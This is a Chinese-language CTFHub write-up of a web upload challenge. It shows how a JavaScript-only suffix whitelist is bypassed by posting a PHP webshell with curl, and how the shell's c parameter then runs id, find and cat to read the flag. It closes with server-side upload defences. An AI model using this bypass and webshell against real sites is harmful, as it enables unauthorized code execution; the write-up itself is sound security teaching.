---
layout: writeup
tags: [ctfhub]

title: "CTFHub CTF Writeup - 前端验证"
date: 2026-10-28

skill: "web-upload/前端验证"
completed: true
---

# CTFHub Writeup - 前端验证

## 题目类型

Web

## 题目描述

题目名称：前端验证n；平台：CTFHub；方向：Web。

## 解题过程

<br>1. 记录显示，用户查看首页表单，发现 \`onsubmit\` 属性调用 \`checkfilesuffix()\`；脚本从文件输入中取最后一个点后的后缀，仅允许 \`.jpg\`、\`.png\`、\`.gif\`，否则 \`alert\` 并 \`return false\` 阻止提交。
<br>2. 用户使用 curl.exe 以 multipart 表单直接提交 shell.php：\`curl.exe -s -F "file=@shell.php;type=application/octet-stream" -F "submit=Submit" http://challenge-67d0e1b9ff1e94d6.sandbox.ctfhub.com:10800/\`，响应出现“上传成功”并给出相对路径 \`upload/shell.php\`。
<br>3. 随后请求上传文件并传入 \`c=id\`，返回 \`uid=33(www-data) gid=33(www-data) groups=33(www-data)\`，说明上传的 PHP 文件可被 Web 服务解析并执行命令。
<br>4. 用户通过 \`?c=find%20/%20-maxdepth%205%20-iname%20%22flag\*%22%202\>/dev/null\` 找到 \`/var/www/html/flag\_254495006.php\`，再用 \`?c=cat%20/var/www/html/flag\_254495006.php\` 读取到 \`\<?php // ctfhub\{10db242b61ec271d10d06c87\}\`。

## 其他方法

记录中还列出抓包改包、禁用 JavaScript、删除 onsubmit 属性等等效思路；推测这些方式也可能绕过前端校验，但记录中未显示实际执行。


## 疑问与解答

### 1.

<br>问题：为什么前端白名单不能阻止上传恶意文件？
<br>解答：前端 JavaScript 只在浏览器内执行，\`onsubmit\` 返回 false 只能阻止浏览器正常提交表单；攻击者可以用 curl 等工具直接构造 HTTP 请求，完全不经过这段校验。如果服务端不再检查，就会接收文件。

### 2.

<br>问题：为什么上传后的 shell.php 能通过 \`c\` 参数执行命令？
<br>解答：上传目录中的 PHP 文件被 Web 服务器交给 PHP 解释器处理，URL 中的 \`c=id\` 会作为请求参数传入脚本；返回 \`uid=33(www-data)\` 表明命令以 Web 服务进程权限执行。

### 3.

<br>问题：为什么直接访问 flag\_254495006.php 看不到 flag？
<br>解答：flag 位于 PHP 注释 \`\<?php // ...\` 中，PHP 解释器不会把注释输出到 HTTP 响应；因此需要先获得命令执行能力，再用 \`cat\` 读取源码或直接读取文件内容。


## 本题的核心逻辑：


<br>前端验证题的本质是客户端校验不具备安全边界作用。浏览器端的 \`onsubmit\` 和 JavaScript 白名单只能约束正常表单提交，抓包、curl 或禁用脚本都可能绕过；如果服务端未再次检查后缀、MIME、内容和存储路径，就可能造成任意文件上传，并在上传目录可执行时进一步形成 RCE。

<br>拿到命令执行后，flag 可能不在网页直接输出，而在源码注释或非公开路径中；本题通过 \`find\` 定位 flag 文件，再用 \`cat\` 读取 PHP 源码注释得到 flag。


## 笔记

这道题主要学习了：

<br>1. 客户端校验不能作为安全边界；任何只在前端执行的后缀、MIME 或大小检查，都可能被直接构造请求或修改页面绕过。
<br>2. 文件上传功能应在服务端做扩展名白名单、内容类型和文件内容校验，重命名文件并限制上传目录的执行权限。
<br>3. 获得命令执行后先枚举文件系统定位目标，再读取源码、配置或注释中的敏感信息。
